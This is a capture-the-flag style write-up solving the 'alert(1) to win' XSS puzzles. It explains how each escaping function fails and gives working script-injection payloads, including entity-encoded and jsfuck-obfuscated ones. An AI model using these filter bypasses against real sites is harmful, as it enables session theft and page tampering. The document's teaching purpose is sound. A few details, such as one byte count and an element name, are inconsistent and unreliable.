# alert-1-to-win-solutions

## Warmup

### Problem

```javascript
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
```

### Solution

This problem is relatively easy. All you need to do is close the `console.log("` with `");`, and append `alert(1)//` to the end of your payload. (Everything after `//` turns into comments).

* **`");alert(1)//`** (13 bytes): 

```javascriptmeaning
<script>console.log("");alert(1)//");</script>
```

You may also use arithmetic operators like `+` or `-` to abridge your payload:

* **`");alert(1-"`** (12 bytes)

In this case, the Javascript becomes

```htmlmixed
<script>console.log("");alert(1-"");</script>
```

Here, the Javascript shows `alert(1-""`). `1-""` is essentially a `1` because  `""` will first be converted to a number, which is 0 according to Javascript's [peculiar type conversion](https://i.imgur.com/BiTO4A4.png).

## Adobe

### Problem

```javascript
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```

### Solution

The challenge replaces `"` globally with `\"`, indicating that closing the script with `");` becomes unfeasible.

Nevetheless, `\` is not escaped, so `\"` turns into `\\"`. As a result, the `\\` morphs into a escaped backslash. The trailing double-quote broke away and can be used to close the script tag again!

Payload (14 bytes): **`\");alert(1)//`**

Result:

```htmlmixed
<script>console.log("\\");alert(1)//");</script>
```

## JSON

### Problem

Try to bypass `JSON.stringify`.

```javascript
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```

### Solution

`JSON.stringify` escapes both `"` and `\`, but thankfully, it does not escape `'`, `/`, `<` and `>`.

Therefore, it's possible to forcibly finish the current script block with `</script>` and starting a new script block. This technique works because the browser will first parses the HTML to identify the tags (including script tags) *before* passing the JavaScript to the javascript engine.

Eventually, you may append `<script>alert(1)//` to the end of your payload to form another script block and execute `alert(1)`.

* **`</script><script>alert(1)//`**

Result:

```htmlmixed
<script>console.log("</script><script>alert(1)//");</script>
```

Interestingly, you may solve the previous two challenges ([Warmup](#Warmup) & [Adobe](#Adobe)) using the same technique.

## Markdown

### Problem

```javascript
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
```

### Solution

In this challenge, `<` and `"` will first be htmlencoded. Later on, `http://` will be replaced by an `<a>` tag. Finally, `[[|]]` will be replaced by an `<img>` tag.

Notice that if you put `http://` inside `[[|]]` (`[[a|http://]]`):

```htmlmixed
<img alt="<a href="http://" src="a.gif">">http://]]</a>
```

The double quotes become mismatched; the `alt` tag becomes `"<a href="`.
In addition, forward slashes `/`, similar to white spaces, can be used to *split attributes*. That is, any words after two `/` in `http://` will be treated as an *attribute*. That is to say, you can add arbitrary attributes to `<img>`.

As a result, you may build the payload like the following (31 bytes):

* **`[[a|http://onerror=alert(1)//]]`**

Output:

```javascript
<img alt="<a href="http://onerror=alert(1)//" src="a.gif">">http://onerror=alert(1)//]]</a>
```

Here, `onerror=alert(1)//` will be parsed and treated as an `onerror` attribute with the value `alert(1)//`.
In addition, The trailing `//` is used to comment out the residual double quote.

## DOM

### Problem

```javascript
function escape(s) {
  // Slightly too lazy to make two input fields.
  // Pass in something like "TextNode#foo"
  var m = s.split(/#/);

  // Only slightly contrived at this point.
  var a = document.createElement('div');
  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
  return a.innerHTML;
}
```

### Solution

First, the `escape` function splits your input with delimeter `#` and stores the result in `m`.
Next, it calls `document['create'+m[0]]` and subsequently invokes the `apply` function. The `apply` function calls `document['create'+m[0]]` and treat `document` as `this`, `slice(1)` as `arguments`.
For example, if your input is `Element#script`, `escape` will invoke `document.createElement('img')`:

```htmlembedded
<script></script>
```

However, we're not allowed to create any attributes, so `createElement` is not an idean candidate.
`createTextNode` seems promising, but unfortunately, this function will html encode your input.

Luckily, `createComment` is viable. You can use `createCommend` to create a comment tag, then enclose it with `-->`. After that, you can construct any blocks as you wism. 

Therefore, appending `<iframe/onload=alert(1)` to your payload should make your browser run `alert(1)`. (the trailing `--` will be considered as an decrement operator)

* **`Comment#--><iframe/onload=alert(1)`**

Output:

```javascript
<!----><iframe/onload=alert(1)-->
```

In normal conditions, the `<svg>` tag should work. However, `svg` is not supported on this site, so in this writeup, I'll use `<iframe>` in replace of `<svg>`.

## Callback

### Problem

```javascript
function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/); 

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/</g, '\\u003c');
  return "<script>" + thing[0] + "(" + json +")</script>";
}
```

### Solution

Again, the input is split into an array using `#` as a delimeter.

`thing[0]` should only be made up of characters in `[a-zA-Z\[\]']`, and `thing[1]` will be stringified. Also, `<` is htmlencoded to `\u003c`.

It's quite interesting to know that `JSON.stringify` *does not escape single quotes*, and simultaneously, `thing[0]` also allow single quotes.

As a result, providing `'#'` as input will mess up the quotations in `<script>`:

```htmlmixed
<script>'({"userdata":"'"})</script>
```

Hence, adding `-alert(1)//` to the end of the second apostrophe tricks the browser to execute `alert(1)`.

* **`'#'-alert(1)//`**

Output:

```htmlmixed
<script>'({"userdata":"'-alert(1)//"})</script>
```

## Skandia

### Problem

This challenge is similar to `Warmup`, except that lowercase ascii letters are not allowed.

```javascript
function escape(s) {
  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```

### Solution

Tags and attribute names in HTML5 are *case insensitive*, and thindicates that `<SCRIPT>` will be considered the same as `</script>`. In other words, you may use `</script>` to coercively close the tag. Yet, `alert` will be converted to `ALERT`, which becomes `undefined` since Javascript is a case-sensitive language.

Fortunately, you can circumvent this restriction via using *html entities*.

An html character entity can be of the following forms: `&{entity_name};`, `&#{decimal_value};`, or `&#x{hex_value};`. For instance, `&amp;`, `&#38;`, `&#x26;` all represents the ampersand character (`&`).

This is because when the browser parses HTML tags, it'll decodes the HTML first. After that, whenever the browser needs to execute some script, the browser then calls the Javascript engine to run Javascript. To elaborate, attribute `onerror=&#97;&#97;&#97;` will be decoded to `onerror=aaa` first, and then the browser will execute `aaa` whenever an error event is triggered.

Consequently, HTML encode `alert(1)` should help you bypass the restrictions.

* **</script><iframe/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>** (58 bytes)
* **</script><iframe/onload=&#97;&#108;&#101;&#114;&#116;(1)>** (57 bytes)

In fact, `;` can be omitted. Don't worry, most browsers still parse these encoded characters correctly. This will help you shorten your payload:

* **</script><iframe/onload=&#x61&#x6c&#x65&#x72&#x74(1)>** (53 bytes)
* **</script><iframe/onload=&#97;&#108;&#101;&#114;&#116;(1)>** (52 bytes)

There's actually another method to solve this challenge. You may convert `alert(1)` into [jsfuck](http://www.jsfuck.com/). This way, your input will not be affect by `toUpperCase` because they're all non-alphanumeric characters.

* **`</script><script>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])()//` ** (872 bytes)

